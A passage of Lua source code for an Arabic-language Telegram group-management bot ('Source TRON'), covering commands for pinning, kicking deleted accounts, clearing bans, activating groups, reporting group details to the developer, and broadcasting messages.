send(msg.chat_id_,msg.id_,"⌁︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
return false  
end
end,nil)
end
--     Source TRON     --
if text and text:match("^الغاء تثبيت الكل$") then  
if DevAbd:sismember(TRON.."Abd:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_Abd(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم الغاء تثبيت الكل'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
https.request('https://api.telegram.org/bot'..TokenBot..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
DevAbd:del(TRON.."Abd:PinnedMsg"..msg.chat_id_)
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"⌁︙انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"⌁︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
return false  
end
end,nil)
end
--     Source TRON     --
if text and text:match("^اعاده تثبيت$") and ChCheck(msg) or text and text:match("^اعاده التثبيت$") and ChCheck(msg) or text and text:match("^اعادة التثبيت$") and ChCheck(msg) then
if DevAbd:sismember(TRON.."Abd:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_Abd(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
local PinId = DevAbd:get(TRON..'Abd:PinnedMsg'..msg.chat_id_)
if PinId then
Pin(msg.chat_id_,PinId,0)
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم اعادة تثبيت الرساله'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
end end
end
--     Source TRON     --
if text == 'طرد المحذوفين' or text == 'مسح المحذوفين' or text == 'طرد الحسابات المحذوفه' or text == 'حذف المحذوفين' then  
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
ChatKick(msg.chat_id_, data.id_)
end
end,nil)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم طرد المحذوفين")  
end,nil)
end
--     Source TRON     --
if text and text:match("^مسح المحظورين$") or text and text:match("^حذف المحظورين$") and ChCheck(msg) or text and text:match("^مسح المطرودين$") or text and text:match("^حذف المطرودين$") and ChCheck(msg) then
local function RemoveBlockList(extra, result)
if tonumber(result.total_count_) == 0 then 
Dev_Abd(msg.chat_id_, msg.id_, 0,'⌁︙*لا يوجد محظورين*', 1, 'md')
DevAbd:del(TRON..'Abd:Ban:'..msg.chat_id_)
else
local x = 0
for x,y in pairs(result.members_) do
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = y.user_id_, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
DevAbd:del(TRON..'Abd:Ban:'..msg.chat_id_)
x = x + 1
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المحظورين")  
end
end
tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 200}, RemoveBlockList, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
end
end
--     Source TRON     --
if text and text:match("^معلومات المجموعه$") and ChCheck(msg) or text and text:match("^عدد الاعضاء$") and ChCheck(msg) or text and text:match("^عدد الكروب$") and ChCheck(msg) or text and text:match("^عدد الادمنيه$") and ChCheck(msg) or text and text:match("^عدد المحظورين$") and ChCheck(msg) then
local Muted = DevAbd:scard(TRON.."Abd:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه ↫ ❨ '..dp.title_..' ❩\n⌁︙الايدي ↫ ❨ '..msg.chat_id_..' ❩\n⌁︙عدد الاعضاء ↫ ❨ *'..data.member_count_..'* ❩\n⌁︙عدد الادمنيه ↫ ❨ *'..data.administrator_count_..'* ❩\n⌁︙عدد المطرودين ↫ ❨ *'..data.kicked_count_..'* ❩\n⌁︙عدد المكتومين ↫ ❨ *'..Muted..'* ❩\n⌁︙عدد رسائل المجموعه ↫ ❨ *'..(msg.id_/2097152/0.5)..'* ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n', 1, 'md') 
end,nil)
end,nil)
end
--     Source TRON     --
if text and text:match('^كشف (-%d+)') then
local ChatId = text:match('كشف (-%d+)') 
if not SudoBot(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمطورين فقط', 1, 'md')
else
local ConstructorList = DevAbd:scard(TRON.."Abd:Constructor:"..ChatId) or 0
local BanedList = DevAbd:scard(TRON.."Abd:Ban:"..ChatId) or 0
local ManagerList = DevAbd:scard(TRON.."Abd:Managers:"..ChatId) or 0
local MutedList = DevAbd:scard(TRON.."Abd:Muted:"..ChatId) or 0
local TkeedList = DevAbd:scard(TRON.."Abd:Abd:Tkeed:"..ChatId) or 0
local AdminsList = DevAbd:scard(TRON.."Abd:Admins:"..ChatId) or 0
local VipList = DevAbd:scard(TRON.."Abd:VipMem:"..ChatId) or 0
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/YYYYAX' end
tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = ChatId:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
if dp.id_ then
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,Abd) 
if Abd.first_name_ ~= false then
ConstructorAbd = "["..Abd.first_name_.."](T.me/"..(Abd.username_ or "YYYYAX")..")"
else 
ConstructorAbd = "حساب محذوف"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙المجموعه ↫ ["..dp.title_.."]("..LinkGroup..")\n⌁︙الايدي ↫ ( `"..ChatId.."` )\n⌁︙المنشئ ↫ "..ConstructorAbd.."\n⌁︙عدد المدراء ↫ ( *"..ManagerList.."* )\n⌁︙عدد المنشئين ↫ ( *"..ConstructorList.."* )\n⌁︙عدد الادمنيه ↫ ( *"..AdminsList.."* )\n⌁︙عدد المميزين ↫ ( *"..VipList.."* )\n⌁︙عدد المحظورين ↫ ( *"..BanedList.."* )\n⌁︙عدد المقيدين ↫ ( *"..TkeedList.."* )\n⌁︙عدد المكتومين ↫ ( *"..MutedList.."* )", 1,"md")
end,nil)
end
end
else
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لم تتم اضافتي بها لاقوم بكشفها", 1, "md")
end
end,nil)
end,nil)
end 
end
--     Source TRON     --
if text and text:match("^غادر (-%d+)$")  then
local Text = { string.match(text, "^(غادر) (-%d+)$")}
if not SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1, 'md')
else 
tdcli_function({ID ="GetChat",chat_id_=Text[2]},function(arg,dp) 
if dp.id_ then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙المجموعه ↫ ["..dp.title_.."]\n⌁︙تمت المغادره منها بنجاح", 1, "md")
Dev_Abd(Text[2], 0, 1, "⌁︙بامر المطور تم مغادرة هذه المجموعه ", 1, "md")  
ChatLeave(dp.id_, TRON)
DevAbd:srem(TRON.."Abd:Groups", dp.id_)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لم تتم اضافتي بها لاقوم بمغادرتها", 1, "md")
end 
end,nil)
end 
end
--     Source TRON     --
if text and text:match("^تعين عدد الاعضاء (%d+)$") and SecondSudo(msg) or text and text:match("^تعيين عدد الاعضاء (%d+)$") and SecondSudo(msg) then
local Num = text:match("تعين عدد الاعضاء (%d+)$") or text:match("تعيين عدد الاعضاء (%d+)$")
DevAbd:set(TRON..'Abd:Num:Add:Bot',Num) 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع عدد الاعضاء ↫ *'..Num..'* عضو', 1, 'md')
end
--     Source TRON     --
if text == 'تفعيل البوت الخدمي' then 
if not Sudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1, 'md')
else 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل البوت الخدمي'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Lock:FreeBot'..TRON) 
end 
end
if text == 'تعطيل البوت الخدمي' then 
if not Sudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1, 'md')
else 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل البوت الخدمي'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Lock:FreeBot'..TRON,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل الالعاب بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Lock:Games'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل الالعاب بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Lock:Games'..msg.chat_id_,true)  
end
if text == "تفعيل الرابط" or text == "تفعيل جلب الرابط" then 
if Admin(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل جلب رابط المجموعه'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON.."Abd:Lock:GpLinks"..msg.chat_id_)
return false  
end
end
if text == "تعطيل الرابط" or text == "تعطيل جلب الرابط" then 
if Admin(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل جلب رابط المجموعه'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON.."Abd:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
--     Source TRON     --
if text and text:match('^تفعيل$') and SudoBot(msg) and ChCheck(msg) then
if ChatType ~= 'sp' then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(DevAbd:get(TRON..'Abd:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙عدد اعضاء المجموعه اقل من ↫ *'..(DevAbd:get(TRON..'Abd:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_
for i=0 , #admins do
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevAbd:sadd(TRON..'Abd:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)
else
DevAbd:sadd(TRON..'Abd:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevAbd:sadd(TRON.."Abd:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevAbd:sadd(TRON.."Abd:AbdConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAbd:srem(TRON.."Abd:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevAbd:srem(TRON.."Abd:AbdConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevAbd:sismember(TRON..'Abd:Groups',msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه بالتاكيد مفعله', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyBy","⌁︙تم تفعيل المجموعه "..dp.title_)  
DevAbd:sadd(TRON.."Abd:Groups",msg.chat_id_)
if not DevAbd:get(TRON..'Abd:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
DevAbd:incrby(TRON..'Abd:Sudos'..msg.sender_user_id_,1)
DevAbd:set(TRON..'Abd:SudosGp'..msg.sender_user_id_..msg.chat_id_,"Abd")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevAbd:set(TRON.."Abd:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(DevId,"⌁︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙بواسطة ↫ "..Name.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⌁︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end
end,nil)
end,nil)
end,nil)
end
if text == 'تعطيل' and SudoBot(msg) and ChCheck(msg) then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevAbd:sismember(TRON..'Abd:Groups',msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه بالتاكيد معطله', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyBy","⌁︙تم تعطيل المجموعه "..dp.title_)  
DevAbd:srem(TRON.."Abd:Groups",msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevAbd:set(TRON.."Abd:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(DevId,"⌁︙تم تعطيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙بواسطة ↫ "..Name.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⌁︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end
end,nil)
end,nil)
end
end
--     Source TRON     --
if text and text:match("^المطور$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
LinkGroup = "⌁︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩"
else
LinkGroup = '⌁︙ليست لدي صلاحية الدعوه لهذه المجموعه !'
end
if not Sudo(msg) then
SendText(DevId,"⌁︙هناك من بحاجه الى مساعده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الشخص ↫ "..Name.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n"..LinkGroup.."\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
--     Source TRON     --
if text == 'جلب نسخه السورس' then
if not Sudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './TRON.lua', '⌁︙نسخة ملف سورس ترون',dl_cb, nil)
end end
--     Source TRON     --
if text == 'روابط الكروبات' or text == 'روابط المجموعات' then
if not SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
local List = DevAbd:smembers(TRON.."Abd:Groups")
if #List == 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا توجد مجموعات مفعله', 1, 'md')
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙جاري ارسال نسخه تحتوي على ↫ '..#List..' مجموعه', 1, 'md')
local Text = "⌁︙Source TRON\n⌁︙File Bot Groups\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local GroupsManagers = DevAbd:scard(TRON.."Abd:Managers:"..v) or 0
local GroupsAdmins = DevAbd:scard(TRON.."Abd:Admins:"..v) or 0
local Groupslink = DevAbd:get(TRON.."Abd:Groups:Links" ..v)
Text = Text..k.." ↬ ⤈ \n⌁︙Group ID ↬ "..v.."\n⌁︙Group Link ↬ "..(Groupslink or "Not Found").."\n⌁︙Group Managers ↬ "..GroupsManagers.."\n⌁︙Group Admins ↬ "..GroupsAdmins.."\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
end
local File = io.open('GroupsBot.txt', 'w')
File:write(Text)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './GroupsBot.txt',dl_cb, nil)
io.popen('rm -rf ./GroupsBot.txt')
end
end
end
--     Source TRON     --
if text == "اذاعه خاص" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه خاص ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevAbd:get(TRON.."Abd:Send:Bot"..TRON) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevAbd:setex(TRON.."Abd:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbd:get(TRON.."Abd:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbd:del(TRON.."Abd:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevAbd:smembers(TRON..'Abd:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
AbdText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
AbdText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
AbdText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
AbdText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
AbdText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
AbdText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
AbdText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
AbdText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة "..AbdText.." بنجاح \n⌁︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
DevAbd:del(TRON.."Abd:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source TRON     --
if text == "اذاعه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه عام ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevAbd:get(TRON.."Abd:Send:Bot"..TRON) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevAbd:setex(TRON.."Abd:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbd:get(TRON.."Abd:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbd:del(TRON.."Abd:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevAbd:smembers(TRON..'Abd:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
AbdText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
AbdText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
AbdText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
AbdText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
AbdText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
AbdText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
AbdText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
AbdText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة "..AbdText.." بنجاح \n⌁︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
DevAbd:del(TRON.."Abd:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source TRON     --
if text == "اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه عام بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevAbd:get(TRON.."Abd:Send:Bot"..TRON) and not SecondSudo(msg) then 
